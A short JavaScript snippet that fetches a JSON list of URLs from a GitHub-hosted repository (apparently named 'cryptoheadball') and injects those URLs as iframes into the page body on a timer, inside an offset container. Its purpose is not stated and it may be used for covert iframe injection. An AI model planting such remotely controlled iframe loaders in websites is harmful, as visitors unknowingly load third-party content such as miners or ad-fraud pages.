/*
<div class="iparent" style=" top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);">

</div>
*/

$('body').append('<div class="iparent" style="top: 50%;left: 50%;transform: translate(50%, 50%);"></div>');
		
fetch('https://raw.githubusercontent.com/inyourpc/inyourpc.github.io/master/cryptoheadball/a.json')
      .then(response => response.json())
     .then(function(json) {
      // handle the response
     	 console.log(json["iframe1"]);
       console.log(json["size"]);
       aaa="https://america.com/index/";
			
      for( j=0;j<json["iframes"].length;j++){
      	console.log("aa"+json["iframes"][j]);
        //add_if(json["iframes"][j], json["timewait"]);
         //setTimeout(add_if(json["iframes"][j] ),json["timewait"]);
         var ab=json["iframes"][j];
         //setTimeout(function() {add_if(ab)}, json["timewait"]*100);
         console.log((json["timewait"]*1000)+(json["timewait_nextif"]*1000*j));
         setTimeout(add_if, (json["timewait"]*1000)+(json["timewait_nextif"]*1000*j), ab);

       //setTimeout(function() {add_if(ab)}, json["timewait"]*100);
       //s setTimeout(add_if,ab ,json["timewait"]*100);
       }
       
       // setTimeout(function() {myWindow.close()}, 3000);
    	}).catch(function() {
     	 // handle the error
       console.log("aa");
   	 });
      //.then(json => console.log(json)).then(json => console.log(json))
      
 function add_if( aa){
$('<iframe src="'+aa+'" frameborder="0" scrolling="no" id="myFrame"></iframe>').appendTo('.iparent');
  console.log(aa);
 
 $(".iparent").appendTo('body'); 

 //myWindow.close()
 
 }/*
 function add_if(aa,ttimewait){
$('<iframe src="'+aa+'" frameborder="0" scrolling="no" id="myFrame"></iframe>').appendTo('.iparent');
  
 
$(".iparent").appendTo('body'); ttimewait*1000);},
 //myWindow.close()
 
 }
 */